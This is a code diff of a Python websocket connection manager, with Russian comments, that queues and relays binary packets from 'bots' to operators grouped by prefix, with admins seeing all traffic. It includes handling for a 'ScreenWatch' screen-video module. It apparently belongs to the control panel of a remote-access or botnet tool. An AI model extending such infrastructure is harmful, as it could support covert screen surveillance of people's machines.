@@ -12,55 +12,128 @@ from logs import Log as logger
 
 
 # ==========================================
-# БЛОК 1: УПРАВЛЕНИЕ WEB-ПОДКЛЮЧЕНИЯМИ
+# БЛОК 1: УПРАВЛЕНИЕ WEB-ПОДКЛЮЧЕНИЯМИ (OPTIMIZED)
 # ==========================================
 class ConnectionManager:
     def __init__(self):
-        self.active = {}  # {login: {"sockets": [], "role": str, "prefix": str}}
+        # {login: [ws1, ws2]}
+        self.active_connections = {}
+        # {prefix: [ws1, ws2]}
+        self.tunnels = {}
+        # {ws: asyncio.Queue} - Очереди на отправку
+        self.queues = {}
+        # {ws: asyncio.Task} - Воркеры отправки
+        self.send_tasks = {}
+        # Кэш префиксов
+        self.bot_prefix_cache = {}
 
     async def connect(self, ws, login, user):
         await ws.accept()
-        self.active.setdefault(login, {
-            "sockets": [],
-            "role": user["role"],
-            "prefix": user["prefix"]
-        })["sockets"].append(ws)
-        logger.info(f"[API] [+] {login} подключен")
+
+        # Увеличиваем размер очереди до 100 для сглаживания микро-задержек
+        queue = asyncio.Queue(maxsize=100)
+        self.queues[ws] = queue
+
+        # Запускаем персональный воркер
+        self.send_tasks[ws] = asyncio.create_task(self._socket_writer(ws, queue))
+
+        self.active_connections.setdefault(login, []).append(ws)
+
+        prefix = user.get("prefix", "NONE")
+        self.tunnels.setdefault(prefix, []).append(ws)
+        if user.get("role") == "admin":
+            self.tunnels.setdefault("ALL", []).append(ws)
+
+        logger.info(f"[API] [+] {login} туннелирован ({prefix}). Очередь создана.")
+
+    async def _socket_writer(self, ws, queue):
+        """Фоновый воркер: берет из очереди и шлет в сокет без задержек."""
+        try:
+            while True:
+                packet = await queue.get()
+                await ws.send_bytes(packet)
+                queue.task_done()
+                # Позволяем event loop переключиться на другие задачи
+                await asyncio.sleep(0)
+        except Exception:
+            pass  # Ошибки сокета обработает disconnect
 
     def disconnect(self, ws, login):
-        if login in self.active:
-            if ws in self.active[login]["sockets"]:
-                self.active[login]["sockets"].remove(ws)
-            if not self.active[login]["sockets"]:
-                self.active.pop(login)
-        logger.info(f"[API] [-] {login} отключен")
+        if ws in self.send_tasks:
+            self.send_tasks[ws].cancel()
+            del self.send_tasks[ws]
 
-    async def broadcast_packet(self, packet: bytes):
-        """Прямая трансляция бинарного пакета разрешенным пользователям."""
-        if not packet or not self.active: return
+        self.queues.pop(ws, None)
+
+        if login in self.active_connections:
+            if ws in self.active_connections[login]:
+                self.active_connections[login].remove(ws)
+
+        for p in list(self.tunnels.keys()):
+            if ws in self.tunnels[p]:
+                self.tunnels[p].remove(ws)
+
+        logger.info(f"[API] [-] {login} отключен, ресурсы очищены.")
+
+    def broadcast_packet_sync(self, packet: bytes):
+        """Рассылка бинарных данных. При переполнении (видео) — полная очистка затора."""
         try:
-            # Наш протокол: [id_len(1)][mod_len(1)][pay_len(4)]
             id_len = packet[0]
-            # ID начинается с 6-го байта (пропускаем заголовок тех-карты)
-            bot_id = packet[6:6 + id_len].decode(errors='ignore')
-            bot_prefix = bot_id.split('-')[0]
+            mod_len = packet[1]
+            raw_id = packet[6:6 + id_len]
 
-            for login, session in self.active.items():
-                # Проверка прав: Admin или совпадение префикса
-                if session["role"] == "admin" or session["prefix"] == "ALL" or session["prefix"] == bot_prefix:
-                    for ws in session["sockets"]:
-                        # Отправляем весь пакет целиком (6б + тело) на фронтенд
-                        asyncio.create_task(self.safe_send(ws, packet))
-        except Exception as e:
-            logger.error(f"[Broadcast Error] {e}")
+            # Извлекаем имя модуля для определения видеопотока
+            # ... извлечение имен ...
+            mod_name_raw = packet[6 + id_len: 6 + id_len + mod_len].decode(errors='ignore').strip()
+            is_video = "ScreenWatch" in mod_name_raw
 
-    async def safe_send(self, ws, packet: bytes):
-        try:
-            await ws.send_bytes(packet)
-        except:
+            # ДОБАВЬ ЭТОТ ПРИНТ:
+            if is_video:
+                print(f"🎬 [VIDEO] Пакет ScreenWatch прошел! Размер: {len(packet)} байт")
+            else:
+                print(f"❓ [OTHER] Модуль: {mod_name_raw}")
+
+            if raw_id not in self.bot_prefix_cache:
+                bot_id = raw_id.decode(errors='ignore')
+                self.bot_prefix_cache[raw_id] = bot_id.split('-')[0]
+
+            prefix = self.bot_prefix_cache[raw_id]
+
+            targets = []
+            if prefix in self.tunnels:
+                targets.extend(self.tunnels[prefix])
+            if "ALL" in self.tunnels:
+                targets.extend(self.tunnels["ALL"])
+
+            if not targets:
+                return
+
+            for ws in targets:
+                queue = self.queues.get(ws)
+                if not queue: continue
+
+                try:
+                    queue.put_nowait(packet)
+                except asyncio.QueueFull:
+                    # КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ:
+                    # Если это видео, то выбрасывать один пакет нельзя (будет каша).
+                    # Мы полностью чистим очередь, чтобы "прыгнуть" к самому новому кадру.
+                    if is_video:
+                        print(f"DEBUG: Отправляю видео-кадр ({len(packet)} байт)")
+                        while not queue.empty():
+                            try:
+                                queue.get_nowait()
+                            except:
+                                break
+                        queue.put_nowait(packet)
+                    else:
+                        # Для обычных команд (не видео) просто игнорируем переполнение
+                        pass
+        except Exception:
             pass
 
 
+# Инициализируем менеджер
 manager = ConnectionManager()
 
 
